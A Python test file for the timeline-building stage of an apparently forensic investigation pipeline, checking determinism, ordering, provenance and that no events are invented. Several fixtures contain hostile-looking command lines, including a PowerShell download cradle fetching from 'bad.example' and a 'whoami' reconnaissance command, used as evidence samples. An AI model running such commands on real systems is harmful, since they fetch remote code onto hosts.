"""Stage 9 · Timeline Builder tests.

Contract under test (owner directive 2026-08-02):
    Timeline is a **renderer** over validated evidence, not an
    inference engine. It may sort, group, annotate, and link
    evidence — never invent, guess, or synthesise events.
"""
from __future__ import annotations

import json

from nivxforge.investigation.pipeline.artifact_discovery import discover
from nivxforge.investigation.pipeline.evidence_extraction import extract
from nivxforge.investigation.pipeline.graph_builder import build as build_graph
from nivxforge.investigation.pipeline.input_classification import classify_input
from nivxforge.investigation.pipeline.normalizers import normalize
from nivxforge.investigation.pipeline.parser import parse_input
from nivxforge.investigation.pipeline.recursive_decoder import decode
from nivxforge.investigation.pipeline.timeline_builder import (
    Timeline, TimelineEntry, build as build_timeline,
)
from nivxforge.investigation.pipeline.vendor_detection import detect_vendor


# ── Test helpers ─────────────────────────────────────────────────────

def _pipeline(raw: str):
    parsed = parse_input(raw, classify_input(raw))
    cem = normalize(parsed, detect_vendor(parsed))
    arts = discover(cem)
    layers = decode(arts)
    bundle = extract(cem, arts, layers)
    graph = build_graph(cem, bundle)
    tl = build_timeline(cem, graph)
    return tl, graph, cem


# ── Structural invariants ───────────────────────────────────────────

def test_timeline_returns_frozen_tuple():
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "h", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    assert isinstance(tl, Timeline)
    assert isinstance(tl.entries, tuple)


def test_timeline_entry_shape_is_stable():
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "h", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    for e in tl.entries:
        assert isinstance(e, TimelineEntry)
        assert e.event_id
        assert e.kind
        assert e.action
        assert e.timestamp_precision in ("exact", "unknown")


# ── Contract: renderer, not inference engine ─────────────────────────

def test_every_entry_references_existing_graph_nodes():
    """No phantom node ids allowed."""
    tl, graph, _ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "host-x", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    node_ids = {n.id for n in graph.nodes}
    for e in tl.entries:
        if e.actor_node_id is not None:
            assert e.actor_node_id in node_ids, (
                f"phantom actor {e.actor_node_id}")
        for t in e.target_node_ids:
            assert t in node_ids, f"phantom target {t}"


def test_every_entry_references_existing_cem_event():
    tl, _, cem = _pipeline(json.dumps({
        "EventID": 1, "Computer": "host-x", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    event_ids = {ev.event_id for ev in cem.events}
    for e in tl.entries:
        assert e.event_id in event_ids


def test_action_verbs_are_deterministic_and_never_invented():
    """Action strings must come from the fixed EventKind→verb map."""
    from nivxforge.investigation.pipeline.timeline_builder import (
        _VERB_BY_KIND,
    )
    allowed = set(_VERB_BY_KIND.values())
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "h", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    for e in tl.entries:
        assert e.action in allowed, f"unexpected verb {e.action}"


def test_summary_is_deterministic_string_only():
    """Same input → identical summary."""
    payload = json.dumps({
        "EventID": 1, "Computer": "h", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    })
    tl_a, *_ = _pipeline(payload)
    tl_b, *_ = _pipeline(payload)
    assert [e.summary for e in tl_a.entries] == \
           [e.summary for e in tl_b.entries]


# ── Determinism ──────────────────────────────────────────────────────

def test_same_cem_and_graph_yield_byte_identical_timeline():
    """Determinism contract: build() must be a pure function of
    (CEM, InvestigationGraph). The upstream normalizer minting fresh
    UUIDs per run is out of scope for the Timeline determinism gate."""
    _, graph, cem = _pipeline(json.dumps({
        "EventID": 1, "Computer": "host-x", "Image": "powershell.exe",
        "CommandLine": "powershell -c whoami",
    }))
    from nivxforge.investigation.pipeline.timeline_builder import (
        build as build_tl,
    )
    a = build_tl(cem, graph).to_dict()
    b = build_tl(cem, graph).to_dict()
    assert a == b


def test_entries_sorted_chronologically_with_unknown_last():
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "h", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    prev_ts = None
    seen_unknown = False
    for e in tl.entries:
        if e.timestamp is None:
            seen_unknown = True
            continue
        assert not seen_unknown, "known-time entry after unknown-time entry"
        if prev_ts is not None:
            assert e.timestamp >= prev_ts
        prev_ts = e.timestamp


# ── Provenance ───────────────────────────────────────────────────────

def test_evidence_refs_are_present_for_every_entry():
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "h", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    for e in tl.entries:
        assert e.evidence_refs
        assert e.event_id in e.evidence_refs


def test_provenance_carries_vendor_route():
    tl, _, cem = _pipeline(json.dumps({
        "EventID": 1, "Computer": "h", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    for e in tl.entries:
        assert "vendor_route" in e.provenance
        assert e.provenance["vendor_route"] == cem.vendor_route


# ── Coverage: does the timeline reflect graph reality? ───────────────

def test_process_events_become_process_entries():
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "host-x", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    kinds = {e.kind for e in tl.entries}
    assert "process" in kinds


def test_network_evidence_produces_network_entry():
    tl, graph, _ = _pipeline(json.dumps({
        "EventID": 3, "Computer": "host-x",
        "Image": "powershell.exe",
        "CommandLine": (
            "powershell -c (New-Object Net.WebClient)"
            ".DownloadString('http://bad.example/p')"
        ),
    }))
    # graph must contain an URL node, and the timeline must reference it.
    urls_in_graph = {n.id for n in graph.nodes if n.kind == "url"}
    referenced = {t for e in tl.entries for t in e.target_node_ids}
    assert urls_in_graph, "graph produced no url node"
    assert urls_in_graph & referenced, "timeline never links the URL"


def test_to_dict_returns_json_serialisable_shape():
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "h", "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    d = tl.to_dict()
    # Must be JSON-round-trippable
    round_tripped = json.loads(json.dumps(d))
    assert round_tripped == d
    assert "entries" in d
    assert "time_span" in d
    assert "unknown_time_count" in d
    assert d["entry_count"] == len(d["entries"])


# ── Non-invention guard ──────────────────────────────────────────────

def test_empty_cem_produces_empty_timeline():
    """No events → no entries. The renderer cannot invent evidence."""
    from datetime import datetime, timezone
    from nivxforge.investigation.cem import (
        CanonicalEventModel, Provenance,
    )
    from nivxforge.investigation.pipeline.graph_builder import (
        InvestigationGraph,
    )
    cem = CanonicalEventModel(
        vendor="test", vendor_route="unit",
        provenance=Provenance(source="unit-test",
                               timestamp=datetime.now(timezone.utc)),
    )
    graph = InvestigationGraph(nodes=(), edges=())
    tl = build_timeline(cem, graph)
    assert tl.entries == ()
    assert tl.unknown_time_count == 0
    assert tl.time_span == {"first": None, "last": None}


def test_event_without_graph_anchor_is_dropped():
    """A CEM event that has no representation in the graph must be
    skipped, not fabricated into a phantom entry."""
    from datetime import datetime, timezone
    from nivxforge.investigation.cem import (
        CanonicalEvent, CanonicalEventModel, EventKind, Provenance,
    )
    from nivxforge.investigation.pipeline.graph_builder import (
        InvestigationGraph,
    )
    prov = Provenance(source="unit-test",
                      timestamp=datetime.now(timezone.utc))
    cem = CanonicalEventModel(
        vendor="test", vendor_route="unit",
        provenance=prov,
        events=[CanonicalEvent(event_id="e1", kind=EventKind.generic,
                                provenance=prov)],
    )
    graph = InvestigationGraph(nodes=(), edges=())
    tl = build_timeline(cem, graph)
    assert tl.entries == ()


# ── Chronological ordering across multi-event CEMs ───────────────────

def _fabricate(cem_events, nodes=(), edges=()):
    from datetime import datetime, timezone
    from nivxforge.investigation.cem import (
        CanonicalEventModel, Provenance,
    )
    from nivxforge.investigation.pipeline.graph_builder import (
        InvestigationGraph,
    )
    prov = Provenance(source="unit-test",
                      timestamp=datetime.now(timezone.utc))
    return (
        CanonicalEventModel(vendor="test", vendor_route="unit",
                             provenance=prov, events=cem_events),
        InvestigationGraph(nodes=tuple(nodes), edges=tuple(edges)),
    )


def test_multi_event_timeline_orders_chronologically():
    """Given three timestamped process_create events supplied out of
    order, the timeline must return them in ascending chronological
    order with matching event_id linkage."""
    from datetime import datetime, timedelta, timezone
    import hashlib
    from nivxforge.investigation.cem import (
        CanonicalEvent, EventKind, Process, Provenance,
    )
    from nivxforge.investigation.pipeline.graph_builder import GraphNode

    prov = Provenance(source="unit-test",
                      timestamp=datetime.now(timezone.utc))
    t0 = datetime(2026, 2, 1, 12, 0, 0, tzinfo=timezone.utc)

    def _process_node(image: str) -> GraphNode:
        h = hashlib.sha256(image.encode()).hexdigest()[:12]
        return GraphNode(id=f"process-{h}", kind="process",
                          label=f"PROCESS · {image}", value=image)

    events = []
    for i, (offset, image) in enumerate([
        (2, "c.exe"), (0, "a.exe"), (1, "b.exe"),
    ]):
        events.append(CanonicalEvent(
            event_id=f"e{i}", kind=EventKind.process_create,
            timestamp=t0 + timedelta(seconds=offset),
            process=Process(image=image, provenance=prov),
            provenance=prov,
        ))
    cem, _ = _fabricate(events)
    nodes = tuple(_process_node(img) for img in ("a.exe", "b.exe", "c.exe"))
    graph_cem_events = events
    _, graph = _fabricate(graph_cem_events, nodes=nodes)

    tl = build_timeline(cem, graph)
    assert len(tl.entries) == 3
    images_in_order = [
        graph.node(e.actor_node_id).value for e in tl.entries
    ]
    assert images_in_order == ["a.exe", "b.exe", "c.exe"]
    # time_span reflects known-timestamped entries
    assert tl.time_span["first"] == t0.isoformat()
    assert tl.time_span["last"] == (t0 + timedelta(seconds=2)).isoformat()
    assert tl.unknown_time_count == 0


def test_mixed_known_and_unknown_timestamps_grouped_correctly():
    from datetime import datetime, timezone
    import hashlib
    from nivxforge.investigation.cem import (
        CanonicalEvent, EventKind, Process, Provenance,
    )
    from nivxforge.investigation.pipeline.graph_builder import GraphNode

    prov = Provenance(source="unit-test",
                      timestamp=datetime.now(timezone.utc))

    def _node(image: str) -> GraphNode:
        h = hashlib.sha256(image.encode()).hexdigest()[:12]
        return GraphNode(id=f"process-{h}", kind="process",
                          label=f"PROCESS · {image}", value=image)

    events = [
        CanonicalEvent(event_id="known",
                        kind=EventKind.process_create,
                        timestamp=datetime(2026, 2, 1, 12, 0, 0,
                                           tzinfo=timezone.utc),
                        process=Process(image="known.exe",
                                        provenance=prov),
                        provenance=prov),
        CanonicalEvent(event_id="unknown",
                        kind=EventKind.process_create,
                        process=Process(image="unknown.exe",
                                        provenance=prov),
                        provenance=prov),
    ]
    cem, _ = _fabricate(events)
    _, graph = _fabricate(events,
                           nodes=(_node("known.exe"),
                                  _node("unknown.exe")))

    tl = build_timeline(cem, graph)
    assert len(tl.entries) == 2
    assert tl.entries[0].timestamp_precision == "exact"
    assert tl.entries[1].timestamp_precision == "unknown"
    assert tl.unknown_time_count == 1


def test_actor_is_never_listed_as_its_own_target():
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "host-x", "Image": "powershell.exe",
        "CommandLine": (
            "powershell -c (New-Object Net.WebClient)"
            ".DownloadString('http://bad.example/p')"
        ),
    }))
    for e in tl.entries:
        assert e.actor_node_id not in e.target_node_ids


def test_evidence_refs_are_unique_per_entry():
    tl, *_ = _pipeline(json.dumps({
        "EventID": 1, "Computer": "host-x", "Image": "powershell.exe",
        "CommandLine": (
            "powershell -c (New-Object Net.WebClient)"
            ".DownloadString('http://bad.example/p')"
        ),
    }))
    for e in tl.entries:
        assert len(e.evidence_refs) == len(set(e.evidence_refs))
